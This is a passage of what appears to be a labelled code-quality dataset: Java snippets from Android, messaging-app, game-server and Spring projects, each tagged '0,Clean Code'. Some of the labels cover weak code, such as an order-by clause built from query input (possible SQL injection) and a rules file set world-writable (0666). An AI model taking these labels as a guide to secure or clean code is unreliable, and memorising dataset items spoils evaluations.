  mViewModel.getSharedPrefsModifiedLiveData().observe(this,modified -> {
    if (modified) {
      if (actionBar != null) {
        actionBar.setTitle(""* "" + mViewModel.getSharedPrefFilename());
      }
    }
 else {
      if (actionBar != null) {
        actionBar.setTitle(mViewModel.getSharedPrefFilename());
      }
    }
  }
);
  mViewModel.loadSharedPrefs();
}
",0,Clean Code
"/** 
 * @return the status
 */
public WorkflowStatus getStatus(){
  return status;
}
",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  DatabaseProfile other=(DatabaseProfile)obj;
  if (identifierQuote == null) {
    if (other.identifierQuote != null)     return false;
  }
 else   if (!identifierQuote.equals(other.identifierQuote))   return false;
  if (name == null) {
    if (other.name != null)     return false;
  }
 else   if (!name.equals(other.name))   return false;
  if (url == null) {
    if (other.url != null)     return false;
  }
 else   if (!url.equals(other.url))   return false;
  return true;
}
",0,Clean Code
"@ParameterizedTest @CsvSource(delimiter=';',value={""{\""arg0\"": \""hello\"", \""arg1\"": \""world\""}; hello_world"",""{\""arg0\"": \""hello\""}; hello_null"",""{}; null_null""}) void should_execute_tool_with_parameters_of_type_string(String arguments,String expectedResult) throws NoSuchMethodException {
  executeAndAssert(arguments,""strings"",String.class,String.class,expectedResult);
}",0,Clean Code
"@Test public void testDefaultPackage() throws Exception {
  CompileUnit unit=new CompileUnit("""",""A"",("""" + ""public class A {\n"" + ""  public int f1;\n""+ ""  public Object f2;\n""+ ""}""));
  ByteArrayClassLoader classLoader=JaninoUtils.compile(Thread.currentThread().getContextClassLoader(),unit);
  Class<?> clz=classLoader.loadClass(""A"");
  Fury fury=Fury.builder().withLanguage(Language.JAVA).withRefTracking(true).withClassLoader(clz.getClassLoader()).requireClassRegistration(false).build();
  Object obj=clz.newInstance();
  Field f1=clz.getDeclaredField(""f1"");
  f1.setAccessible(true);
  f1.set(obj,2);
  Object newObj=fury.deserialize(fury.serialize(obj));
  Assert.assertEquals(f1.get(newObj),2);
}",0,Clean Code
"@Override public <T,E extends Throwable>void onError(RetryContext context,RetryCallback<T,E> callback,Throwable throwable){
  onErrorRetryCount=context.getRetryCount();
}
",0,Clean Code
"public int getSizeOfUnmatchedInstructions(final ESide side){
  return side == ESide.PRIMARY ? priInstructions - matchedInstructions : secInstructions - matchedInstructions;
}
",0,Clean Code
"@Override protected void doCommand(String installationDir,boolean viaInstaller,String[] args){
  String alg=CLIOptionsParser.parseOption(""--with_alg"",args);
  if (alg != null && alg.equalsIgnoreCase(""bcrypt"")) {
    String targetTimePerHashMsStr=CLIOptionsParser.parseOption(""--with_time_per_hash_ms"",args);
    int targetTimePerHashMs=300;
    if (targetTimePerHashMsStr != null) {
      targetTimePerHashMs=Integer.parseInt(targetTimePerHashMsStr);
    }
    calibrateBCrypt(targetTimePerHashMs);
  }
 else   if (alg != null && alg.equalsIgnoreCase(""argon2"")) {
    String targetTimePerHashMsStr=CLIOptionsParser.parseOption(""--with_time_per_hash_ms"",args);
    int targetTimePerHashMs=300;
    if (targetTimePerHashMsStr != null) {
      targetTimePerHashMs=Integer.parseInt(targetTimePerHashMsStr);
    }
    String hashingPoolSizeStr=CLIOptionsParser.parseOption(""--with_argon2_hashing_pool_size"",args);
    int hashingPoolSize=1;
    if (hashingPoolSizeStr != null) {
      hashingPoolSize=Integer.parseInt(hashingPoolSizeStr);
    }
    String maxMemoryMbStr=CLIOptionsParser.parseOption(""--with_argon2_max_memory_mb"",args);
    int maxMemoryMb=1024;
    if (maxMemoryMbStr != null) {
      maxMemoryMb=Integer.parseInt(maxMemoryMbStr);
    }
    String parallelismStr=CLIOptionsParser.parseOption(""--with_argon2_parallelism"",args);
    int parallelism=Runtime.getRuntime().availableProcessors() * 2;
    if (parallelismStr != null) {
      parallelism=Integer.parseInt(parallelismStr);
    }
    try {
      calibrateArgon2Hashing(targetTimePerHashMs,hashingPoolSize,maxMemoryMb,parallelism);
    }
 catch (    TooLowMemoryProvidedForArgon2 ignored) {
      Logging.error("""");
      Logging.error(""====FAILED===="");
      Logging.error(""Optimal Argon2 settings could not be calculated. Try increasing the amount of memory given "" + ""(using --with_argon2_max_memory_mb), or reducing the amount of concurrent hashing "" + ""(using --with_argon2_hashing_pool_size)"");
    }
  }
 else {
    Logging.error(""Please provide one of --with_alg=argon2 or --with_alg=bcrypt"");
  }
}",0,Clean Code
"@Bean public JobDetail dealCategoryJobDetail(){
  return JobBuilder.newJob(DealCategoryJob.class).withIdentity(DealCategoryJob.class.getName()).storeDurably().build();
}
",0,Clean Code
"public static RawFlowGraph loadRawFlowGraph(CommentsDatabase database,Diff diff,IAddress functionAddr,ESide side) throws IOException, SQLException {
  var primaryExportFileReader=new BinExport2Reader(diff.getExportFile(ESide.PRIMARY),ESide.PRIMARY);
  var secondaryExportFileReader=new BinExport2Reader(diff.getExportFile(ESide.SECONDARY),ESide.SECONDARY);
  RawFunction function=diff.getCallGraph(side).getFunction(functionAddr);
  if (function == null) {
    return null;
  }
  if (function.getFunctionType() == EFunctionType.IMPORTED) {
    return new RawFlowGraph(functionAddr,function.getName(),function.getFunctionType(),new ArrayList<>(),new ArrayList<>(),side);
  }
  RawFlowGraph flowGraph=side == ESide.PRIMARY ? primaryExportFileReader.readFlowGraph(diff,functionAddr) : secondaryExportFileReader.readFlowGraph(diff,functionAddr);
  String imageHash=diff.getDiffMetaData().getImageHash(side);
  if (database != null) {
    Map<Pair<IAddress,ECommentPlacement>,String> instructionComments=database.readInstructionComments(imageHash,functionAddr);
    Map<IAddress,String> basicBlockComments=database.readBasicblockComments(imageHash,functionAddr);
    setBasicBlockComments(flowGraph,basicBlockComments);
    setInstructionComment(flowGraph,instructionComments);
  }
  return flowGraph;
}",0,Clean Code
"@Override public Boolean exists(String key){
  return jedisCluster.exists(key);
}
",0,Clean Code
"public MistralAiEmbeddingOptions getOptions(){
  return this.options;
}
",0,Clean Code
"private PolynomialKernelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private PolynomialKernelProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@426c5a49",0,Clean Code
"@Override public void add(ChatMessage message){
  List<ChatMessage> messages=messages();
  if (message instanceof SystemMessage) {
    Optional<SystemMessage> systemMessage=findSystemMessage(messages);
    if (systemMessage.isPresent()) {
      if (systemMessage.get().equals(message)) {
        return;
      }
 else {
        messages.remove(systemMessage.get());
      }
    }
  }
  messages.add(message);
  ensureCapacity(messages,maxMessages);
  store.updateMessages(id,messages);
}
",0,Clean Code
"public int getBeamWidth(){
  return beamWidth;
}
",0,Clean Code
"@Override public void visitPair(VmPair value){
  cannotRenderTypeAddConverter(value);
}
",0,Clean Code
"public static void setMiBackgroundBlurRadius(View view,int i){
  InvokeUtils.callMethod(View.class,view,""setMiBackgroundBlurRadius"",new Class[]{int.class},i);
}
",0,Clean Code
"public HanaCloudVectorStoreConfigBuilder topK(int topK){
  this.topK=topK;
  return this;
}
",0,Clean Code
"public PacketGetShopListScRsp(int shopType){
  super(CmdId.GetShopListScRsp);
  var data=GetShopListScRsp.newInstance().setShopType(shopType);
  for (  ShopExcel shopExcel : GameData.getShopExcelMap().values()) {
    if (shopExcel.getShopType() != shopType || shopExcel.getGoods().size() == 0) {
      continue;
    }
    Shop shop=Shop.newInstance().setShopId(shopExcel.getId()).setCityLevel(1).setEndTime(Integer.MAX_VALUE);
    for (    var goodsExcel : shopExcel.getGoods().values()) {
      shop.addGoodsList(goodsExcel.toProto());
    }
    data.addShopList(shop);
  }
  this.setData(data);
}",0,Clean Code
"@After public void tearDown(){
  TestUtil.deleteQuietly(testDirectory);
}
",0,Clean Code
"RelationshipView parseRelationship(DynamicViewDslContext context,Tokens tokens){
  DynamicView view=context.getView();
  if (tokens.size() > 1 && StructurizrDslTokens.RELATIONSHIP_TOKEN.equals(tokens.get(RELATIONSHIP_TOKEN_INDEX))) {
    if (tokens.hasMoreThan(TECHNOLOGY_INDEX)) {
      throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR_1);
    }
    if (!tokens.includes(DESTINATION_IDENTIFIER_INDEX)) {
      throw new RuntimeException(""Expected: "" + GRAMMAR_1);
    }
    String sourceId=tokens.get(SOURCE_IDENTIFIER_INDEX);
    String destinationId=tokens.get(DESTINATION_IDENTIFIER_INDEX);
    Element sourceElement=context.getElement(sourceId);
    if (sourceElement == null) {
      throw new RuntimeException(""The source element \"""" + sourceId + ""\"" does not exist"");
    }
    if (!(sourceElement instanceof StaticStructureElement || sourceElement instanceof CustomElement)) {
      throw new RuntimeException(""The source element \"""" + sourceId + ""\"" should be a static structure or custom element"");
    }
    Element destinationElement=context.getElement(destinationId);
    if (destinationElement == null) {
      throw new RuntimeException(""The destination element \"""" + destinationId + ""\"" does not exist"");
    }
    if (!(destinationElement instanceof StaticStructureElement || destinationElement instanceof CustomElement)) {
      throw new RuntimeException(""The destination element \"""" + destinationId + ""\"" should be a static structure or custom element"");
    }
    String description="""";
    if (tokens.includes(DESCRIPTION_INDEX)) {
      description=tokens.get(DESCRIPTION_INDEX);
    }
    String technology="""";
    if (tokens.includes(TECHNOLOGY_INDEX)) {
      technology=tokens.get(TECHNOLOGY_INDEX);
    }
    if (sourceElement instanceof StaticStructureElement && destinationElement instanceof StaticStructureElement) {
      return view.add((StaticStructureElement)sourceElement,description,technology,(StaticStructureElement)destinationElement);
    }
 else     if (sourceElement instanceof StaticStructureElement && destinationElement instanceof CustomElement) {
      return view.add((StaticStructureElement)sourceElement,description,technology,(CustomElement)destinationElement);
    }
 else     if (sourceElement instanceof CustomElement && destinationElement instanceof StaticStructureElement) {
      return view.add((CustomElement)sourceElement,description,technology,(StaticStructureElement)destinationElement);
    }
 else     if (sourceElement instanceof CustomElement && destinationElement instanceof CustomElement) {
      return view.add((CustomElement)sourceElement,description,technology,(CustomElement)destinationElement);
    }
  }
 else {
    String relationshipId=tokens.get(RELATIONSHIP_IDENTIFIER_INDEX);
    Relationship relationship=context.getRelationship(relationshipId);
    if (tokens.hasMoreThan(RELATIONSHIP_IDENTIFIER_INDEX + 1)) {
      throw new RuntimeException(""Too many tokens, expected: "" + GRAMMAR_2);
    }
    if (relationship == null) {
      throw new RuntimeException(""The relationship \"""" + relationshipId + ""\"" does not exist"");
    }
    String description="""";
    if (tokens.includes(RELATIONSHIP_IDENTIFIER_INDEX + 1)) {
      description=tokens.get(RELATIONSHIP_IDENTIFIER_INDEX + 1);
    }
    return view.add(relationship,description);
  }
  throw new RuntimeException(""The specified relationship could not be added"");
}",0,Clean Code
"@Override public void execute(CommandArgs args){
  if (LunarCore.getGameDatabase() == null) {
    args.sendMessage(""Error: Game database not connected"");
    return;
  }
  if (args.getTarget() != null) {
    args.sendMessage(""Error: Targeted player is online"");
    return;
  }
  Player player=LunarCore.getGameDatabase().getObjectByField(Player.class,""_id"",args.getTargetUid());
  if (player != null) {
    player.resetPosition();
    player.save();
    args.sendMessage(""Player unstuck successfully"");
  }
 else {
    args.sendMessage(""Error: Player not found in database"");
  }
}
",0,Clean Code
"public Builder withMetadataFields(MetadataField... fields){
  return withMetadataFields(Arrays.asList(fields));
}
public Builder withMetadataFields(List<MetadataField> fields){
  this.metadataFields=fields;
  return this;
}
",0,Clean Code
"@Override public synchronized void stop(){
  logger.info(""[STOP {} SOURCE]{} stopping..."",this.getProtocolName(),this.cachedSrcName);
  if (!allChannels.isEmpty()) {
    try {
      allChannels.close().awaitUninterruptibly();
    }
 catch (    Exception e) {
      logger.warn(""Close {} netty channels throw exception"",this.cachedSrcName,e);
    }
 finally {
      allChannels.clear();
    }
  }
  if (channelFuture != null) {
    try {
      channelFuture.channel().closeFuture().sync();
    }
 catch (    InterruptedException e) {
      logger.warn(""Close {} channel future throw exception"",this.cachedSrcName,e);
    }
  }
  super.stop();
  if (this.acceptorGroup != null) {
    this.acceptorGroup.shutdownGracefully();
  }
  if (this.workerGroup != null) {
    this.workerGroup.shutdownGracefully();
  }
  if (enableFileMetric) {
    if (monitorIndex != null) {
      monitorIndex.stop();
    }
    if (monitorStats != null) {
      monitorStats.stop();
    }
  }
  logger.info(""[STOP {} SOURCE]{} stopped"",this.getProtocolName(),this.cachedSrcName);
}
",0,Clean Code
"@Override protected void onActivityResult(int requestCode,int resultCode,Intent data){
  if (SharedConfig.passcodeHash.length() != 0 && SharedConfig.lastPauseTime != 0) {
    SharedConfig.lastPauseTime=0;
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""reset lastPauseTime onActivityResult"");
    }
    UserConfig.getInstance(currentAccount).saveConfig(false);
  }
  if (requestCode == 105) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
      if (ApplicationLoader.canDrawOverlays=Settings.canDrawOverlays(this)) {
        if (GroupCallActivity.groupCallInstance != null) {
          GroupCallActivity.groupCallInstance.dismissInternal();
        }
        AndroidUtilities.runOnUIThread(() -> {
          GroupCallPip.clearForce();
          GroupCallPip.updateVisibility(LaunchActivity.this);
        }
,200);
      }
    }
    return;
  }
  super.onActivityResult(requestCode,resultCode,data);
  if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
    if (resultCode == Activity.RESULT_OK) {
      VoIPService service=VoIPService.getSharedInstance();
      if (service != null) {
        VideoCapturerDevice.mediaProjectionPermissionResultData=data;
        service.createCaptureDevice(true);
      }
    }
  }
 else   if (callbacks.containsKey(requestCode)) {
    callbacks.remove(requestCode).invoke(data);
    return;
  }
  ThemeEditorView editorView=ThemeEditorView.getInstance();
  if (editorView != null) {
    editorView.onActivityResult(requestCode,resultCode,data);
  }
  if (actionBarLayout.getFragmentStack().size() != 0) {
    BaseFragment fragment=actionBarLayout.getFragmentStack().get(actionBarLayout.getFragmentStack().size() - 1);
    fragment.onActivityResultFragment(requestCode,resultCode,data);
  }
  if (AndroidUtilities.isTablet()) {
    if (rightActionBarLayout.getFragmentStack().size() != 0) {
      BaseFragment fragment=rightActionBarLayout.getFragmentStack().get(rightActionBarLayout.getFragmentStack().size() - 1);
      fragment.onActivityResultFragment(requestCode,resultCode,data);
    }
    if (layersActionBarLayout.getFragmentStack().size() != 0) {
      BaseFragment fragment=layersActionBarLayout.getFragmentStack().get(layersActionBarLayout.getFragmentStack().size() - 1);
      fragment.onActivityResultFragment(requestCode,resultCode,data);
    }
    NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.onActivityResultReceived,requestCode,resultCode,data);
  }
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.classification.sgd.protos.FMClassificationModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.classification.sgd.protos.FMClassificationModelProto other=(org.tribuo.classification.sgd.protos.FMClassificationModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (hasParams() != other.hasParams())   return false;
  if (hasParams()) {
    if (!getParams().equals(other.getParams()))     return false;
  }
  if (hasNormalizer() != other.hasNormalizer())   return false;
  if (hasNormalizer()) {
    if (!getNormalizer().equals(other.getNormalizer()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Specialization(rewriteOn=FrameSlotTypeException.class) protected Object evalObject(VirtualFrame frame) throws FrameSlotTypeException {
  return frame.getObject(slot);
}
",0,Clean Code
"/** 
 * <code>optional uint32 unique_id = 9;</code>
 * @return this
 */
public RogueCommonPendingAction clearUniqueId(){
  bitField0_&=~0x00000001;
  uniqueId=0;
  return this;
}",0,Clean Code
"/** 
 * Save the disabled components in the  {@link #SYSTEM_RULES_PATH}.
 * @return {@code true} iff the components could be saved.
 */
private boolean saveDisabledComponents(boolean apply){
  if (readOnly) {
    Log.e(TAG,""Read-only instance."");
    return false;
  }
  if (!apply || componentCount() == 0) {
    mRulesFile.delete();
    return true;
  }
  StringBuilder activities=new StringBuilder();
  StringBuilder services=new StringBuilder();
  StringBuilder receivers=new StringBuilder();
  for (  ComponentRule component : getAllComponents()) {
    if (!component.isIfw())     continue;
    String componentFilter=""  <component-filter name=\"""" + packageName + ""/""+ component.name+ ""\""/>\n"";
switch (component.type) {
case ACTIVITY:
      activities.append(componentFilter);
    break;
case RECEIVER:
  receivers.append(componentFilter);
break;
case SERVICE:
services.append(componentFilter);
break;
case PROVIDER:
}
}
String rules=""<rules>\n"" + ((activities.length() == 0) ? """" : ""<activity block=\""true\"" log=\""false\"">\n"" + activities + ""</activity>\n"") + ((services.length() == 0) ? """" : ""<service block=\""true\"" log=\""false\"">\n"" + services + ""</service>\n"")+ ((receivers.length() == 0) ? """" : ""<broadcast block=\""true\"" log=\""false\"">\n"" + receivers + ""</broadcast>\n"")+ ""</rules>"";
FileOutputStream rulesStream=null;
try {
rulesStream=mRulesFile.startWrite();
Log.d(TAG,""Rules: %s"",rules);
rulesStream.write(rules.getBytes());
mRulesFile.finishWrite(rulesStream);
mRulesFile.getBaseFile().setMode(0666);
return true;
}
 catch (IOException e) {
Log.e(TAG,""Failed to write rules for package %s"",e,packageName);
mRulesFile.failWrite(rulesStream);
return false;
}
catch (ErrnoException e) {
Log.w(TAG,""Failed to alter permission of IFW for package %s"",e,packageName);
return true;
}
}",0,Clean Code
"@NonNull List<Integer> getSpecialType();
",0,Clean Code
"@Test public void ex3(){
  var ex3=module.getProperty(""ex3"");
  List<Byte> mapped1=mapper.map(ex3,Types.listOf(Byte.class));
  assertThat(mapped1).containsExactly((byte)1,(byte)2,(byte)3);
  List<Short> mapped2=mapper.map(ex3,Types.listOf(Short.class));
  assertThat(mapped2).containsExactly((short)1,(short)2,(short)3);
  List<Integer> mapped3=mapper.map(ex3,Types.listOf(Integer.class));
  assertThat(mapped3).containsExactly(1,2,3);
  List<Long> mapped4=mapper.map(ex3,Types.listOf(Long.class));
  assertThat(mapped4).containsExactly(1L,2L,3L);
}",0,Clean Code
"public int maxDegree(){
  return maxDegree;
}
",0,Clean Code
"public ClaudeAiStreamClient build(){
  return new ClaudeAiStreamClient(this);
}
",0,Clean Code
"@Override public void visibilityChanged(){
  AbstractGraphNodeTree.this.updateUI();
}
",0,Clean Code
"@Override public Long setnx(final String key,final String value){
  try {
    return redis.setnx(key,value);
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}
",0,Clean Code
"@Override public V put(K key,V value){
  array[offset++]=key;
  array[offset++]=value;
  return null;
}
",0,Clean Code
"/** 
 * extract and process bin heart beat msg, message type is 8
 */
private void procBinHeartbeatMsg(BaseSource source,Channel channel,ByteBuf cb,int totalDataLen) throws Exception {
  if (totalDataLen < BIN_HB_FIXED_CONTENT_SIZE) {
    source.fileMetricIncSumStats(StatConstants.EVENT_MSG_HB_TOTALLEN_BELOWMIN);
    String errMsg=String.format(""Malformed msg, totalDataLen(%d) < min hb-msg length(%d)"",totalDataLen,BIN_HB_FIXED_CONTENT_SIZE);
    if (logger.isDebugEnabled()) {
      logger.debug(errMsg + "", channel {}"",channel);
    }
    throw new PkgParseException(errMsg);
  }
  int msgHeadPos=cb.readerIndex() - 5;
  int bodyLen=cb.getInt(msgHeadPos + BIN_HB_BODYLEN_OFFSET);
  int attrLen=cb.getShort(msgHeadPos + BIN_HB_BODY_OFFSET + bodyLen);
  int msgMagic=cb.getUnsignedShort(msgHeadPos + BIN_HB_BODY_OFFSET + bodyLen+ BIN_HB_ATTRLEN_SIZE+ attrLen);
  if (msgMagic != BIN_MSG_MAGIC) {
    source.fileMetricIncSumStats(StatConstants.EVENT_MSG_HB_MAGIC_UNEQUAL);
    String errMsg=String.format(""Malformed msg, msgMagic(%d) != %d"",msgMagic,BIN_MSG_MAGIC);
    if (logger.isDebugEnabled()) {
      logger.debug(errMsg + "", channel {}"",channel);
    }
    throw new PkgParseException(errMsg);
  }
  if (totalDataLen + BIN_HB_TOTALLEN_SIZE < (bodyLen + attrLen + BIN_HB_FORMAT_SIZE)) {
    source.fileMetricIncSumStats(StatConstants.EVENT_MSG_HB_LEN_MALFORMED);
    String errMsg=String.format(""Malformed msg, bodyLen(%d) + attrLen(%d) > totalDataLen(%d)"",bodyLen,attrLen,totalDataLen);
    if (logger.isDebugEnabled()) {
      logger.debug(errMsg + "", channel {}"",channel);
    }
    throw new PkgParseException(errMsg);
  }
  byte version=cb.getByte(msgHeadPos + BIN_HB_VERSION_OFFSET);
  byte[] attrData=null;
  if (attrLen > 0) {
    attrData=new byte[attrLen];
    cb.getBytes(msgHeadPos + BIN_HB_BODY_OFFSET + bodyLen+ BIN_HB_ATTRLEN_SIZE,attrData,0,attrLen);
  }
  flushV0MsgPackage(source,channel,buildHBRspPackage(attrData,version,0),MsgType.MSG_BIN_HEARTBEAT.name());
}",0,Clean Code
"@Override public CfCarParkPackagePriceExample getExampleByQuery(CfCarParkPackagePriceQuery cfCarParkPackagePriceQuery){
  CfCarParkPackagePriceExample cfCarParkPackagePriceExample=new CfCarParkPackagePriceExample();
  CfCarParkPackagePriceExample.Criteria criteria=cfCarParkPackagePriceExample.createCriteria();
  if (cfCarParkPackagePriceQuery.getTitle() != null) {
    criteria.andTitleLike(cfCarParkPackagePriceQuery.getTitle());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getId())) {
    criteria.andIdEqualTo(cfCarParkPackagePriceQuery.getId());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getCarParkId())) {
    criteria.andCarParkIdEqualTo(cfCarParkPackagePriceQuery.getCarParkId());
  }
  if (cfCarParkPackagePriceQuery.getCarParkIds() != null && cfCarParkPackagePriceQuery.getCarParkIds().size() > 0) {
    criteria.andCarParkIdIn(cfCarParkPackagePriceQuery.getCarParkIds());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getFlagKey())) {
    criteria.andFlagKeyEqualTo(cfCarParkPackagePriceQuery.getFlagKey());
  }
  if (cfCarParkPackagePriceQuery.getSpecialGive() != null) {
    criteria.andSpecialGiveEqualTo(cfCarParkPackagePriceQuery.getSpecialGive());
  }
  if (cfCarParkPackagePriceQuery.getSpecialCarPackage() != null) {
    criteria.andSpecialCarPackageEqualTo(cfCarParkPackagePriceQuery.getSpecialCarPackage());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getOrderBy())) {
    cfCarParkPackagePriceExample.setOrderByClause(cfCarParkPackagePriceQuery.getOrderBy());
  }
  if (StringUtils.isNotEmpty(cfCarParkPackagePriceQuery.getOrderBy())) {
    cfCarParkPackagePriceExample.setOrderByClause(cfCarParkPackagePriceQuery.getOrderBy());
  }
  if (cfCarParkPackagePriceQuery.getPage() != null && cfCarParkPackagePriceQuery.getSize() != null) {
    PageHelper.startPage(cfCarParkPackagePriceQuery.getPage(),cfCarParkPackagePriceQuery.getSize());
  }
  return cfCarParkPackagePriceExample;
}",0,Clean Code
"@Bean @ConditionalOnMissingBean public OpenAiAudioSpeechClient openAiAudioSpeechClient(OpenAiConnectionProperties commonProperties,OpenAiAudioSpeechProperties speechProperties,ResponseErrorHandler responseErrorHandler){
  String apiKey=StringUtils.hasText(speechProperties.getApiKey()) ? speechProperties.getApiKey() : commonProperties.getApiKey();
  String baseUrl=StringUtils.hasText(speechProperties.getBaseUrl()) ? speechProperties.getBaseUrl() : commonProperties.getBaseUrl();
  Assert.hasText(apiKey,""OpenAI API key must be set"");
  Assert.hasText(baseUrl,""OpenAI base URL must be set"");
  var openAiAudioApi=new OpenAiAudioApi(baseUrl,apiKey,RestClient.builder(),responseErrorHandler);
  OpenAiAudioSpeechClient openAiSpeechClient=new OpenAiAudioSpeechClient(openAiAudioApi,speechProperties.getOptions());
  return openAiSpeechClient;
}
",0,Clean Code
"public static HandleFriendScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new HandleFriendScRsp(),data).checkInitialized();
}
public static HandleFriendScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new HandleFriendScRsp(),input).checkInitialized();
}
public static HandleFriendScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new HandleFriendScRsp(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * Returns an OutputStream to write to the file. The file will be truncated immediately.
 */
private static int getTemporaryAlbumId(final Context context){
  final File temporaryTrack;
  try {
    temporaryTrack=installTemporaryTrack(context);
  }
 catch (  final IOException ex) {
    Log.w(""MediaFile"",""Error installing temporary track."",ex);
    return 0;
  }
  final Uri filesUri=MediaStore.Files.getContentUri(""external"");
  final String[] selectionArgs={temporaryTrack.getAbsolutePath()};
  final ContentResolver contentResolver=context.getContentResolver();
  Cursor cursor=contentResolver.query(filesUri,ALBUM_PROJECTION,MediaStore.MediaColumns.DATA + ""=?"",selectionArgs,null);
  if (cursor == null || !cursor.moveToFirst()) {
    if (cursor != null) {
      cursor.close();
      cursor=null;
    }
    final ContentValues values=new ContentValues();
    values.put(MediaStore.MediaColumns.DATA,temporaryTrack.getAbsolutePath());
    values.put(MediaStore.MediaColumns.TITLE,""{MediaWrite Workaround}"");
    values.put(MediaStore.MediaColumns.SIZE,temporaryTrack.length());
    values.put(MediaStore.MediaColumns.MIME_TYPE,""audio/mpeg"");
    values.put(MediaStore.Audio.AudioColumns.IS_MUSIC,true);
    contentResolver.insert(filesUri,values);
  }
  cursor=contentResolver.query(filesUri,ALBUM_PROJECTION,MediaStore.MediaColumns.DATA + ""=?"",selectionArgs,null);
  if (cursor == null) {
    return 0;
  }
  if (!cursor.moveToFirst()) {
    cursor.close();
    return 0;
  }
  final int id=cursor.getInt(0);
  final int albumId=cursor.getInt(1);
  final int mediaType=cursor.getInt(2);
  cursor.close();
  final ContentValues values=new ContentValues();
  boolean updateRequired=false;
  if (albumId == 0) {
    values.put(MediaStore.Audio.AlbumColumns.ALBUM_ID,13371337);
    updateRequired=true;
  }
  if (mediaType != 2) {
    values.put(""media_type"",2);
    updateRequired=true;
  }
  if (updateRequired) {
    contentResolver.update(filesUri,values,BaseColumns._ID + ""="" + id,null);
  }
  cursor=contentResolver.query(filesUri,ALBUM_PROJECTION,MediaStore.MediaColumns.DATA + ""=?"",selectionArgs,null);
  if (cursor == null) {
    return 0;
  }
  try {
    if (!cursor.moveToFirst()) {
      return 0;
    }
    return cursor.getInt(1);
  }
  finally {
    cursor.close();
  }
}",0,Clean Code
"protected void onGuildUserMedalsUpdated(String str,String str2){
}",0,Clean Code
"private GradleProject updateGradleModel(GradleProject gp){
  Map<String,GradleDependencyConfiguration> nameToConfiguration=gp.getNameToConfiguration();
  Map<String,GradleDependencyConfiguration> newNameToConfiguration=new HashMap<>(nameToConfiguration.size());
  boolean anyChanged=false;
  for (  GradleDependencyConfiguration gdc : nameToConfiguration.values()) {
    GradleDependencyConfiguration newGdc=gdc;
    newGdc=newGdc.withRequested(ListUtils.map(gdc.getRequested(),requested -> {
      if (depMatcher.matches(requested.getGroupId(),requested.getArtifactId())) {
        GroupArtifactVersion gav=requested.getGav();
        if (newGroupId != null) {
          gav=gav.withGroupId(newGroupId);
        }
        if (newArtifactId != null) {
          gav=gav.withArtifactId(newArtifactId);
        }
        if (gav != requested.getGav()) {
          return requested.withGav(gav);
        }
      }
      return requested;
    }
));
    newGdc=newGdc.withDirectResolved(ListUtils.map(gdc.getDirectResolved(),resolved -> {
      if (depMatcher.matches(resolved.getGroupId(),resolved.getArtifactId())) {
        ResolvedGroupArtifactVersion gav=resolved.getGav();
        if (newGroupId != null) {
          gav=gav.withGroupId(newGroupId);
        }
        if (newArtifactId != null) {
          gav=gav.withArtifactId(newArtifactId);
        }
        if (gav != resolved.getGav()) {
          return resolved.withGav(gav);
        }
      }
      return resolved;
    }
));
    anyChanged|=newGdc != gdc;
    newNameToConfiguration.put(newGdc.getName(),newGdc);
  }
  if (anyChanged) {
    gp=gp.withNameToConfiguration(newNameToConfiguration);
  }
  return gp;
}
",0,Clean Code
"/** 
 * <code>optional string signature = 9;</code>
 * @return the signature
 */
public String getSignature(){
  return signature.getString();
}",0,Clean Code
"/** 
 * <code>optional .ChessRogueMiracleData miracle_data = 13;</code>
 * @param value the miracleData to set
 * @return this
 */
public ChessRogueMiracleInfo setMiracleData(final ChessRogueMiracleDataOuterClass.ChessRogueMiracleData value){
  bitField0_|=0x00000001;
  miracleData.copyFrom(value);
  return this;
}",0,Clean Code
"public int getItemCountInternal(){
  if (foundContextBot != null && !inlineMediaEnabled) {
    return 1;
  }
  if (stickers != null) {
    return stickers.size();
  }
 else   if (searchResultBotContext != null) {
    return searchResultBotContext.size() + (searchResultBotContextSwitch != null || searchResultBotWebViewSwitch != null ? 1 : 0);
  }
 else   if (searchResultUsernames != null) {
    return searchResultUsernames.size();
  }
 else   if (searchResultHashtags != null) {
    return searchResultHashtags.size();
  }
 else   if (searchResultCommands != null) {
    return searchResultCommands.size();
  }
 else   if (searchResultSuggestions != null) {
    return searchResultSuggestions.size();
  }
  return 0;
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code BattleEquipment}
 */
public static BattleEquipment newInstance(){
  return new BattleEquipment();
}
",0,Clean Code
"@Override public Boolean parse(String string){
  return Boolean.parseBoolean(string);
}
",0,Clean Code
"public static void visitFriendToday(String id,int count){
  id=FriendIdMap.getCurrentUid() + ""-"" + id;
  Statistics stat=getStatistics();
  VisitFriendLog vfl;
  int index=-1;
  for (int i=0; i < stat.visitFriendLogList.size(); i++)   if (stat.visitFriendLogList.get(i).userId.equals(id)) {
    index=i;
    break;
  }
  if (index < 0) {
    vfl=new VisitFriendLog(id);
    stat.visitFriendLogList.add(vfl);
  }
 else {
    vfl=stat.visitFriendLogList.get(index);
  }
  vfl.visitCount=count;
  save();
}",0,Clean Code
